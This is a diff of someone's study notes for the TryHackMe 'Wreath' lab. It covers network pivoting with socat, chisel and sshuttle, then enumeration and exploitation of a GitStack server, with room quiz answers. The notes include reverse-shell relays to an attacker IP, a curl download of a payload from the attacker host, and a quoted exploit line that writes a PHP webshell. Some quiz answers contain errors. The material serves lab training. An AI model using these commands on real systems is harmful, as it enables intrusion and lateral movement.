@@ -273,8 +273,7 @@ cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse
 
  command: curl ATTACKING_IP/socat -o /tmp/socat-USERNAME && chmod +x /tmp/socat-USERNAME
 
- Method Reverse shell Relay
- --------------------------
+ ### Method Reverse shell Relay
 
   1) First let's start a standard netcat listener on our attacking box 
 
@@ -284,10 +283,9 @@ cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse
  
  command: ./socat tcp-l:8000 tcp:ATTACKING_IP:443 & 
 
- ## Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.
+ **Note: the order of the two addresses matters here. Make sure to open the listening port first, then connect back to the attacking machine.**
 
- A brief explanation of the above command:
- -----------------------------------------
+ ### A brief explanation of the above command:
 
 
  ==> tcp-l:8000 :
@@ -304,13 +302,13 @@ cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse
 
 
 
-  Easy Method of Port Forwording
-  -------------------------------
+  ### Easy Method of Port Forwording
 
+The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
 
-  ## The quick and easy way to set up a port forward with socat is quite simply to open up a listening port on the compromised server, and redirect whatever comes into it to the target server. For example, if the compromised server is 172.16.0.5 and the target is port 3306 of 172.16.0.10, we could use the following command (on the compromised server) to create a port forward:
-
+```
   command : ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+```
 
   fork : option is used to put every connection into a new process.
 
@@ -319,65 +317,72 @@ cmd.exe /c echo y  at the start is for non-interactive shells (like most reverse
   & : to background the shell, allowing us to keep using the same terminal session on the compromised server for other things.
 
 
-  Method Port Forwarding -- Quiet
-  -------------------------------
+  ### Method Port Forwarding -- Quiet
 
-  ## The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
+The previous technique is quick and easy, but it also opens up a port on the compromised server, which could potentially be spotted by any kind of host or network scanning. Whilst the risk is not massive, it pays to know a slightly quieter method of port forwarding with socat. This method is marginally more complex, but doesn't require opening up a port externally on the compromised server.
 
   1) First of all, on our own attacking machine, we issue the following command:
 
+```
   command: socat tcp-l:8001 tcp-l:8000,fork,reuseaddr &
-
-  ### This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.
+```
+This opens up two ports: 8000 and 8001, creating a local port relay. What goes into one of them will come out of the other. For this reason, port 8000 also has the fork and reuseaddr options set, to allow us to create more than one connection using this port forward.
 
 
   2) Next, on the compromised relay server (172.16.0.5 in the previous example) we execute this command:
  
+ ```
  command: ./socat tcp:ATTACKING_IP:8001 tcp:TARGET_IP:TARGET_PORT,fork &
+```
 
- ## This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
+This makes a connection between our listening port 8001 on the attacking machine, and the open port of the target server. To use the fictional network from before, we could enter this command as:
 
+```
  command: ./socat tcp:10.50.73.2:8001 tcp:172.16.0.10:80,fork &
+```
 
- ## This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!
+This would create a link between port 8000 on our attacking machine, and port 80 on the intended target (172.16.0.10), meaning that we could go to localhost:8000 in our attacking machine's web browser to load the webpage served by the target: 172.16.0.10:80!
 
- ## This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:
+This is quite a complex scenario to visualise, so let's quickly run through what happens when you try to access the webpage in your browser:
 
-  ==> The request goes to 127.0.0.1:8000
+ - The request goes to 127.0.0.1:8000
 
-  ==> Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
+ - Due to the socat listener we started on our own machine, anything that goes into port 8000, comes out of port 8001
 
-  ==> Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
+ - Port 8001 is connected directly to the socat process we ran on the compromised server, meaning that anything coming out of port 8001 gets sent to the compromised server, where it gets relayed to port 80 on the target server.
 
 
-
-  ## The process is then reversed when the target sends the response:
+The process is then reversed when the target sends the response:
  
-  ==> The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
+- The response is sent to the socat process on the compromised server. What goes into the process comes out at the other side, which happens to link straight to port 8001 on our attacking machine.
 
-  ==> Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.
+- Anything that goes into port 8001 on our attacking machine comes out of port 8000 on our attacking machine, which is where the web browser expects to receive its response, thus the page is received and rendered.
 
-
+```
   Q1:  Which socat option allows you to reuse the same listening port for more than one connection?
   A: reuseaddr
-
-  ## 
+``` 
 
 If your Attacking IP is 172.16.0.200, how would you relay a reverse shell to TCP port 443 on your Attacking Machine using a static copy of socat in the current directory? 
 
+```
 Q2: Use TCP port 8000 for the server listener, and do not background the process.
 A:  ./socat tcp-l:8000 tcp:172.16.0.200:443
+```
 
-## hint: ./socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT
+**hint: ./socat tcp-l:LISTEN_PORT tcp:ATTACKING_IP:ATTACKING_PORT**
 
+```
 Q3: What command would you use to forward TCP port 2222 on a compromised server, to 172.16.0.100:22, using a static copy of socat in the current directory, and backgrounding the process (easy method)?
 A: ./socat tcp-l:2222,fork,reuseaddr 172.16.0.100:22 &
+```
 
-## Hint easy method
+**Hint easy method**
+```
 command: ./socat tcp-l:33060,fork,reuseaddr tcp:172.16.0.10:3306 &
+```
 
-
-## Optional question  Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.
+Optional question  Try to create an encrypted port forward or relay using the OPENSSL options in socat. Task 7 of the shells room may help with this.
 
 As i have no subcription so i google it and i found this link to create encripted connetion using socat
 
@@ -386,328 +391,321 @@ Link: https://blogs.query.ai/creating-a-secure-encrypted-channel-with-socat
 And this article about encripted connection using socat they say:
 
 
-Creating an encrypted communication channel between two socat instances
-------------------------------------------------------------------------
-
+### Creating an encrypted communication channel between two socat instances
 
 For more serious purposes, such as creating an encrypted channel with two socat instances, we would also want to use OpenSSL. So first, let's create a certificate that is self-signed for your FQDN. Here is the cert generation process first:
 
+```
 $ openssl genrsa -out server.key 2048
 $ openssl req -new -key server.key -x509 -days 365 -out server.crt
+```
 
 For this walkthrough, we will name it localhost. Then do this:
 
+```
 $ cat server.key server.cert > server.pem
 $ chmod 0600 server.pem server.key
+```
 
 Now we are ready to run a secure SSL/TLS encrypted communication channel between two socat instances. One acts as an SSL server and one as the client, which the server prints out a command output. The client connects, reads the output on an encrypted channel, and then returns. This process is just one example of what we can achieve. You can also ask the client to read from standard input or echo what the client sends to store the client data on a file.
 
 On a tmux split terminal type this:
 
+```
 $ socat ssl-l:2443,reuseaddr,fork,cert=server.pem,cafile=server.crt,verify=1 exec:'/bin/date’
+```
 
 On the other terminal please invoke the client:
 
+```
 $ socat - ssl:localhost:2443,cert=server.pem,cafile=server.crt
+```
 
 I get this as output.
-
+```
 Tue Jun 30 13:17:23 IST 2020
+```
 
 Now to echo:
 
+```
 $ socat echo -
-
+```
 You can type something which will get returned.
 
-
-
-
-
-
-Chisel:
--------
+### Chisel
 
 secure copy method to send binary to compromise machine 
-command: scp -i KEY chisel user@target:/tmp/chisel-USERNAME
+
+```
+$ scp -i KEY chisel user@target:/tmp/chisel-USERNAME
+```
+
+### Method Reverse SOCKS Proxy:
+
+Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.
+
+- On our own attacking box we would use a command that looks something like this:
+
+```
+$ ./chisel server -p LISTEN_PORT --reverse &
+```
+
+This sets up a listener on your chosen LISTEN_PORT.
+
+- On the compromised host, we would use the following command:
+
+```
+./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
+```
+
+This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.
+
+Note the use of `R:socks` in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. 
 
 
-Method Reverse SOCKS Proxy:
----------------------------
 
-## Let's start by looking at setting up a reverse SOCKS proxy with chisel. This connects back from a compromised server to a listener waiting on our attacking machine.
+### Method Forward SOCKS Proxy:
 
-On our own attacking box we would use a command that looks something like this:
+- First, on the compromised host we would use:
 
-command: ./chisel server -p LISTEN_PORT --reverse &
+```
+$ ./chisel server -p LISTEN_PORT --socks5
+```
 
-## This sets up a listener on your chosen LISTEN_PORT.
+- On our own attacking box we would then use:
 
-## On the compromised host, we would use the following command:
+```
+$ ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
+```
 
-command: ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
-
-## This command connects back to the waiting listener on our attacking box, completing the proxy. As before, we are using the ampersand symbol (&) to background the processes.
-
-## Note the use of R:socks in this command. "R" is prefixed to remotes (arguments that determine what is being forwarded or proxied -- in this case setting up a proxy) when connecting to a chisel server that has been started in reverse mode. It essentially tells the chisel client that the server anticipates the proxy or port forward to be made at the client side (e.g. starting a proxy on the compromised target running the client, rather than on the attacking machine running the server). Once again, reading the chisel help pages for more information is recommended. 
-
-
-
-Method Forward SOCKS Proxy:
----------------------------
-
-## First, on the compromised host we would use:
-
-command: ./chisel server -p LISTEN_PORT --socks5
-
-## On our own attacking box we would then use:
-
-command: ./chisel client TARGET_IP:LISTEN_PORT PROXY_PORT:socks
-
-## In this command, PROXY_PORT is the port that will be opened for the proxy.
-
+In this command, PROXY_PORT is the port that will be opened for the proxy.
 
 Example:
+```
+$ ./chisel client 172.16.0.10:8080 1337:socks
+```
+
+would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
 
 
-command: ./chisel client 172.16.0.10:8080 1337:socks
+### Proxychains Reminder:
 
-## would connect to a chisel server running on port 8080 of 172.16.0.10. A SOCKS proxy would be opened on port 1337 of our attacking machine.
+When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:
 
-
-
-## Note: 
---------
-
-Proxychains Reminder:
----------------------
-## When sending data through either of these proxies, we would need to set the port in our proxychains configuration. As Chisel uses a SOCKS5 proxy, we will also need to change the start of the line from socks4 to socks5:
-
-
+```
 [ProxyList]
 # add proxy here ...
 # meanwhile
 # defaults set to "tor"
 socks5  127.0.0.1 1080
+```
 
 
+### Method Remote Port Forward
 
-Method Remote Port Forward:
----------------------------
+For a remote port forward, on our attacking machine we use the exact same command as before:
 
-## For a remote port forward, on our attacking machine we use the exact same command as before:
+```
+./chisel server -p LISTEN_PORT --reverse &
+```
 
-command: ./chisel server -p LISTEN_PORT --reverse &
-
-## Once again this sets up a chisel listener for the compromised host to connect back to.
+Once again this sets up a chisel listener for the compromised host to connect back to.
 The command to connect back is slightly different this time, however:
 
-command: ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+```
+$ ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
+```
 
-## You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons.
+You may recognise this as being very similar to the SSH reverse port forward method, where we specify the local port to open, the target IP, and the target port, separated by colons.
 
+`Note the distinction between the LISTEN_PORT and the LOCAL_PORT`
 
-##  Note the distinction between the LISTEN_PORT and the LOCAL_PORT
+- `LISTEN_PORT:` this is the port that we started the chisel server on.
 
-==> LISTEN_PORT: this is the port that we started the chisel server on.
+- `LOCAL_PORT:` this is the port we wish to open on our own attacking machine to link with the desired target port
 
+**Example:**
 
-==> LOCAL_PORT: this is the port we wish to open on our own attacking machine to link with the desired target port
+To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
 
+```
+$ ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
+```
 
-Example:
+Connecting back to our attacking machine, functioning as a chisel server started with:
 
-##  To use an old example, let's assume that our own IP is 172.16.0.20, the compromised server's IP is 172.16.0.5, and our target is port 22 on 172.16.0.10. The syntax for forwarding 172.16.0.10:22 back to port 2222 on our attacking machine would be as follows:
+```
+$ ./chisel server -p 1337 --reverse & 
+```
 
-command: ./chisel client 172.16.0.20:1337 R:2222:172.16.0.10:22 &
+### Method Local Port Forword:
 
+As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
 
- ## Connecting back to our attacking machine, functioning as a chisel server started with:
+- On the compromised target we set up a chisel server:
 
-command: ./chisel server -p 1337 --reverse & 
+```
+$ ./chisel server -p LISTEN_PORT
+```
 
+We now connect to this from our attacking machine like so:
 
-Method Local Port Forword:
---------------------------
-
-
-## As with SSH, a local port forward is where we connect from our own attacking machine to a chisel server listening on a compromised target.
-
-On the compromised target we set up a chisel server:
-
-command: ./chisel server -p LISTEN_PORT
-
-## We now connect to this from our attacking machine like so:
-
-command: ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+```
+$ ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+```
 
 Example: 
 
 For example, to connect to 172.16.0.5:8000 (the compromised host running a chisel server), forwarding our local port 2222 to 172.16.0.10:22 (our intended target), we could use:
 
-command: ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
-
-
-
+```
+$ ./chisel client 172.16.0.5:8000 2222:172.16.0.10:22
+```
+```
 Q1: What command would you use to start a chisel server for a reverse connection on your attacking machine?
 
 Use port 4242 for the listener and do not background the process.
 A: ./chisel server -p 4242 --reverse
+```
+**hint: command: ./chisel server -p LISTEN_PORT --reverse &**
 
-## hint: command: ./chisel server -p LISTEN_PORT --reverse &
-
-
+```
 Q2: What command would you use to connect back to this server with a SOCKS proxy from a compromised host, assuming your own IP is 172.16.0.200 and backgrounding the process?
 A: ./chisel client 172.16.0.200:4242 R:socks &
+```
+**hint command: ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &**
 
-## hint command: ./chisel client ATTACKING_IP:LISTEN_PORT R:socks &
-
+```
 Q3: How would you forward 172.16.0.100:3306 to your own port 33060 using a chisel remote port forward, assuming your own IP is 172.16.0.200 and the listening port is 1337? Background this process.
 A: ./chisel client 172.16.0.200:1337 R:33060:172.16.0.100 &
+```
+**hint command syntax : ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &**
 
-## hint command syntax : ./chisel client ATTACKING_IP:LISTEN_PORT R:LOCAL_PORT:TARGET_IP:TARGET_PORT &
-
-
+```
 Q4: If you have a chisel server running on port 4444 of 172.16.0.5, how could you create a local portforward, opening port 8000 locally and linking to 172.16.0.10:80?
 A: ./chisal client 172.16.0.5:4444 8000:172.16.0.10:80
+```
+**hint command syntax:  ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT**
 
-## hint command syntax:  ./chisel client LISTEN_IP:LISTEN_PORT LOCAL_PORT:TARGET_IP:TARGET_PORT
+### sshuttle:
 
+This can be install on kali with simple command 
+```
+$ sudo apt install sshuttle
+```
 
+The base command for connecting to a server with sshuttle is as follows:
 
- sshuttle:
- ---------
+```
+$ sshuttle -r username@address subnet  
+```
+**command Example:**
 
+In our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
+```
+$ sshuttle -r user@172.16.0.5 172.16.0.0/24
+```
+they ask for user password and then proxy established
 
- this can be install on kali with simple command 
+rather then specifing subnet we would us -N that set it autometicly based on compromise server routing table 
 
- command: sudo apt install sshuttle
+so command like this 
 
+command syntax: `sshuttle -r username@address -N`
 
- ## The base command for connecting to a server with sshuttle is as follows:
+bear in mind this is not always seccessfull
 
- command:  sshuttle -r username@address subnet  
- 
+As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.
 
- command Example:
-
-
-  ## In our fictional 172.16.0.x network with a compromised server at 172.16.0.5, the command may look something like this:
- 
- command:  sshuttle -r user@172.16.0.5 172.16.0.0/24
-
-  they would be user password and then proxy established
-
-  rather then specifing subnet we would us -N that set it autometicly based on compromise server routing table 
-
-  so command like this 
-
-  command syntax: sshuttle -r username@address -N
-
-  ## bear in mind this is not always seccessfull
-
-
-  #### As with the previous tools, these commands could also be backgrounded by appending the ampersand (&) symbol to the end.
 
 If this has worked, you should see the following line:
+``
 c : Connected to server.
+``
 
+what happend if we have no password for the compromise server we have only its ssh keyfile.Unfortunativly sshuttle have no keyfile authentication method so this is easyly bypass by using "--ssh-cmd"  switch .
 
-## what happend if we have no password for the compromise server we have only its ssh keyfile.Unfortunativly sshuttle have no keyfile authentication method so this is easyly bypass by using "--ssh-cmd"  switch .
-
---ssh-cmd: This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile
+`--ssh-cmd`: This switch allows us to specify what command gets executed by sshuttle when trying to authenticate with the compromised server. By default this is simply ssh with no arguments. With the --ssh-cmd switch, we can pick a different command to execute for authentication: say, ssh -i keyfile
 
 so when we have only keyfile authentication so we use command like this 
 
-command syntax: sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET
+command syntax: `sshuttle -r user@address --ssh-cmd "ssh -i KEYFILE" SUBNET`
 
- ### To use our example from before, the command would be:
+To use our example from before, the command would be:
 
-command: sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24
+command: `sshuttle -r user@172.16.0.5 --ssh-cmd "ssh -i private_key" 172.16.0.0/24`
 
- 
-
-
- ### while conecting to the server we may encounter some error like this 
-
-
-
+while conecting to the server we may encounter some error like this 
+```
  client: Connected.
 client_loop: send disconnect: Broken pipe
 client: fatal: server died with error code 255
+```
 
-
-
-### This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
+This can occur when the compromised machine you're connecting to is part of the subnet you're attempting to gain access to. For instance, if we were connecting to 172.16.0.5 and trying to forward 172.16.0.0/24, then we would be including the compromised server inside the newly forwarded subnet, thus disrupting the connection and causing the tool to die.
 
 so To get around this, we tell sshuttle to exlude the compromised server from the subnet range using the -x switch.
 
 Now with the include this switch our like this 
 
+command: `sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5`
 
-command: sshuttle -r user@172.16.0.5 172.16.0.0/24 -x 172.16.0.5
-
-## This will allow sshuttle to create a connection without disrupting itself.
-
-
+This will allow sshuttle to create a connection without disrupting itself.
+```
 Q1: How would you use sshuttle to connect to 172.16.20.7, with a username of "pwned" and a subnet of 172.16.0.0/16
 
 A: sshuttle -r pwned@172.16.20.7 172.16.0.0/24
+```
+**hint:   sshuttle -r username@address subnet** 
 
-## hint:   sshuttle -r username@address subnet 
-
+```
 Q2: What switch (and argument) would you use to tell sshuttle to use a keyfile called "priv_key" located in the current directory?
 
 A: --ssh-cmd ssh -i priv_key
+```
+**hint: --ssh-cmd**
 
-## hint: --ssh-cmd
-
+```
 Q3: You are trying to use sshuttle to connect to 172.16.0.100.  You want to forward the 172.16.0.x/24 range of IP addreses, but you are getting a Broken Pipe error.
 
 What switch (and argument) could you use to fix this error?
 
 A: -x 172.16.0.100
+```
+**hint: -x** 
 
-## hint: -x 
-
-##
 command that are use in my network to create proxy is
 
-cmd:  sshuttle -r root@10.200.105.200 10.200.105.0/24 --ssh-cmd "ssh -i THM/Wreath/ssh_key/id_rsa" -x 10.200.105.200
-##
+cmd: `sshuttle -r root@10.200.105.200 10.200.105.0/24 --ssh-cmd "ssh -i THM/Wreath/ssh_key/id_rsa" -x 10.200.105.200`
 
- Conclusion:
- -----------
+### Conclusion:
 
- ###As a summary of the tools in this section:
+As a summary of the tools in this section:
+- Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
+- SSH can be used to create both port forwards, and proxies
+- plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
+- Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
+- Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
+- sshuttle is a nicer way to create a proxy when we have SSH access on a target
 
-    Proxychains and FoxyProxy are used to access a proxy created with one of the other tools
-    SSH can be used to create both port forwards, and proxies
-    plink.exe is an SSH client for Windows, allowing you to create reverse SSH connections on Windows
-    Socat is a good option for redirecting connections, and can be used to create port forwards in a variety of different ways
-    Chisel can do the exact same thing as with SSH portforwarding/tunneling, but doesn't require SSH access on the box
-    sshuttle is a nicer way to create a proxy when we have SSH access on a target
+---
 
+### Git Server Enumeration Phase
 
-======================================================================================================================================================
+To send binaries like nmap to the target/compromise system there are diffrent method to send it like SCP(secure copy),python server,apache server,php server etc but we use python server now 
 
+- go to the directory where you static binary presence open teminal here and user command 
 
-Git Server Enumeration Phase
------------------------------
+command: `sudo python3 -m http.server 80`
 
-## To send binaries like nmap to the target/compromise system there are diffrent method to send it like SCP(secure copy),python server,apache server,php server etc but we use python server now 
+**Note dont close the terminal.close it when you download the binary to the compromise system**
 
-==> go to the directory where you static binary presence open teminal here and user command 
+Above command open a port 80 on your system and create a server to the directory where you binaries are presence so just use the following commnand to your compromise system to download the file 
 
-command: sudo python3 -m http.server 80
+command: `curl {ATTACKING_IP}/{file name} -o /tmp/nmap-USERNAME && chmod +x /tmp/{file name}`
 
-## Note dont close the terminal.close it when you download the binary to the compromise system
-
-## Above command open a port 80 on your system and create a server to the directory where you binaries are presence so just use the following commnand to your compromise system to download the file 
-
-command: curl {ATTACKING_IP}/{file name} -o /tmp/nmap-USERNAME && chmod +x /tmp/{file name}
-
-
+```
 {ATTACKING_IP}: attacking ip is your attacking machine ip 
 
 {file name}: file name is your binary name ## case sensitive
@@ -715,24 +713,30 @@ command: curl {ATTACKING_IP}/{file name} -o /tmp/nmap-USERNAME && chmod +x /tmp/
 -o : this flag is use to save the binary to the path 
 
 && chmod +x : this is use to make your binary executable 
+```
 
-## you can use wget command to download the file also 
+you can use wget command to download the file also 
 
-command: wget http://attacking_ip/binary_name
+command: `wget http://attacking_ip/binary_name`
 
 this command save the binary your corrent directry
 
-## nmap scan report shows to ip excluding other that are not use 
+---
+
+nmap scan report shows to ip excluding other that are not use 
 
 IP Addr 1 = (10.200.104.100) MAC Address: 02:BC:EC:04:FA:2B 
 IP Addr 2 = (10.200.104.150) MAC Address: 02:9C:29:A9:96:67
 
+```
 Q1: Excluding the out of scope hosts, and the current host (.200), how many hosts were discovered active on the network?
 A: 2
-
+```
+```
 Q2: In ascending order, what are the last octets of these host IPv4 addresses? (e.g. if the address was 172.16.0.80, submit the 80)
 A: 100,150
-
+```
+```
 Nmap scan report of machine 1
 
 
@@ -746,107 +750,114 @@ PORT     STATE SERVICE
 5357/tcp open  wsdapi
 5985/tcp open  wsman
 MAC Address: 02:F4:7E:8B:78:3F (Unknown)
-
-
+```
+```
 Q3: Which TCP ports (in ascending order, comma separated) below port 15000, are open on the remaining target?
 A: 80,3389,5985
-
+```
+```
 Q4: Assuming that the service guesses made by Nmap are accurate, which of the found services is more likely to contain an exploitable vulnerability?
 A: http
+```
 
 
-
-Git Server Pivoting Phase:
---------------------------
+### Git Server Pivoting Phase:
 
 Now we have to pivote things with the pivoting tecniques mention above so now we use sshuttle to pivote our connection using command 
 
-command: sshuttle -r root@10.200.104.200 --ssh-cmd "ssh -i ~/THM/Wreath/ssh_key/id_rsa" 10.200.104.0/24 -x 10.200.104.200
+command: `sshuttle -r root@10.200.104.200 --ssh-cmd "ssh -i ~/THM/Wreath/ssh_key/id_rsa" 10.200.104.0/24 -x 10.200.104.200`
 
-## After connection is sucessfull we see its web server to our attacking machine with any browser just write the ip address of the machine on the browser and we see the page on our attacking machine 
+After connection is sucessfull we see its web server to our attacking machine with any browser just write the ip address of the machine on the browser and we see the page on our attacking machine 
 
+```
 Q1: What is the name of the program running the service?
 A: gitstack
+```
 
-## hint When you first connect to the service you will see an error screen with three expected routing patterns given. The second pattern (without the symbols at the start and end) is the answer to this question. Append it to the URL to get to a login screen.
+hint When you first connect to the service you will see an error screen with three expected routing patterns given. The second pattern (without the symbols at the start and end) is the answer to this question. Append it to the URL to get to a login screen.
 
-## After going to the login page they shows default credentials test it 
+After going to the login page they shows default credentials test it 
 
+```
 Q2: Do these default credentials work (Aye/Nay)?
 A: Nay
-
-## so, they are not work so we have to do other things so first check if they have public exploite 
+```
+so, they are not work so we have to do other things so first check if they have public exploite 
 we search the exploit to our own exploitdb with the command 
 
-command: searchsploit gitstack  
+command: `searchsploit gitstack`  
 
 this shows the public exploite one of them have python remote code execution(RCE)
 
+```
 Q3: You will see that there are three publicly available exploits.
 There is one Python RCE exploit for version 2.3.10 of the service. What is the EDB ID number of this exploit?
 A: 43777
+```
+**hint: The EDB ID number is given as part of the exploit name. Look under the "Path" column of the results table. You're looking for an exploit called NUMBER.py. The number (by itself, without the file extension) is the answer to this question.**
 
-## hint: The EDB ID number is given as part of the exploit name. Look under the "Path" column of the results table. You're looking for an exploit called NUMBER.py. The number (by itself, without the file extension) is the answer to this question.
 
-
-Git Server Code Review: 
------------------------
-
+### Git Server Code Review: 
 
 As we find the exploit that might work on the target so we can mirror the exploite to our machine with the command
 
-command: searchsploit -m EDBID
+command: `searchsploit -m EDBID`
 
 This command copy the exploite and we can use this exploite now
 
-## Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:
+Unfortunately, the local exploit copies stored by searchsploit use DOS line endings, which can cause problems in scripts when executed on Linux:
 Before we can use the exploit, we must convert these into Linux line endings using the dos2unix tool:
 
-command: dos2unix ./EDBID.py
+command: `dos2unix ./EDBID.py`
 
 Or if we have not dostounix tool install so we can use this command 
 
-command: sed -i 's/\r//' ./EDBID.py
+command: `sed -i 's/\r//' ./EDBID.py`
 
+```
 Q1: Look at the information at the top of the script. On what date was this exploit written?
 A: 18.01.2018
+```
 
-## As this is the python script we have to identify which python version they are written because python2 program not run with python3 compiler and vise versa so we have check it 
+As this is the python script we have to identify which python version they are written because python2 program not run with python3 compiler and vise versa so we have check it 
 
-## One method we discussed here is by "print" statement in the code. Is program print statement have rounding brackets in the code then it is python3 program .e.g. print ("hello world!") . If not then they are python2 program .e.g. print "hello world!" .
+One method we discussed here is by "print" statement in the code. Is program print statement have rounding brackets in the code then it is python3 program .e.g. print ("hello world!") . If not then they are python2 program .e.g. print "hello world!" .
 
+```
 Q2: Bearing this in mind, is the script written in Python2 or Python3?
 A: python2
+```
+now we know what version of python they use so we can run it by two method 
 
-## now we know what version of python they use so we can run it by two method 
+1. Using the appropriate interpreter directly (e.g. python3 exploit.py / python2 exploit.py)
 
-1) Using the appropriate interpreter directly (e.g. python3 exploit.py / python2 exploit.py)
+2. Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: #!. You then specify the absolute path to the interpreter, so: #!/usr/bin/python3 / #!/usr/bin/python2 / #!/bin/sh, etc. This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.
 
-2) Adding a shebang line in at the top of the exploit. A shebang tells the Unix program loader which interpreter to use to run a script. Shebangs always start with the characters: #!. You then specify the absolute path to the interpreter, so: #!/usr/bin/python3 / #!/usr/bin/python2 / #!/bin/sh, etc. This means that if we execute the script using ./exploit.py, it will be executed by the correct interpreter.
-
-
+```
 Q3: Just to confirm that you have been paying attention to the script: What is the name of the cookie set in the POST request made on line 74 (line 73 if you didn't add the shebang) of the exploit? 
 A: csrftoken
+```
+
+### Git Server Exploitation: 
 
 
-Git Server Exploitation: 
-------------------------
+we have the exploit and we made changes with our sakes now we have run it and check it is it works in my case they work perfectly and they gave me command execution with NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
 
-## we have the exploit and we made changes with our sakes now we have run it and check it is it works in my case they work perfectly and they gave me command execution with NT AUTHORITY\SYSTEM, the highest ranking local account on a Windows target.
+from that we know that machine is windows machine 
 
-## from that we know that machine is windows machine 
+so we have command execution on the machine so we have to choices to gain a reverse shell 
 
-### so we have command execution on the machine so we have to choices to gain a reverse shell 
+1. We could change the command in the exploit and re-run the code
 
-1) We could change the command in the exploit and re-run the code
-## change the command and re run the make another file so thats not so good 
+change the command and re run the make another file so thats not so good 
 
-2) We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
-## this looks betters so now we do this 
+2.  We could use our knowledge of the script to leverage the same webshell to execute more commands for us, without performing the full exploit twice
 
-## from the code
+this looks betters so now we do this 
 
-##
+from the code
+
+```
 print "[+] Create backdoor in PHP"
 r = requests.get('http://{}/web/index.php?p={}.git&a=summary'.format(ip, repository), auth=HTTPBasicAuth(username, 'p && echo "<?php system($_POST[\'a\']); ?>" > c:\GitStack\gitphp\exploit-NoobHacker69.php'))
